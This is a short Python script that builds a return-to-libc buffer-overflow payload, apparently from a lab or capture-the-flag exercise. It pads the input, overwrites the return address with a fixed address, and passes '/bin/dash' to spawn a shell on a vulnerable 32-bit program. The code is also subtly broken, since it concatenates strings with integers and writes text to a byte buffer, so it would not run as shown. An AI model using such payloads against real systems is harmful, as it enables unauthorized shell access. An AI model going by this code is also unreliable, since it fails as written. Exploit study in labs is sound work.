import sys
filler = "D"*22
addr = 0x0804ef50

dummy_ret = "f"*4
arg = 0xbffefaa8

command = "/bin/dash"
sys.stdout.buffer.write(filler + addr + dummy_ret + arg + command)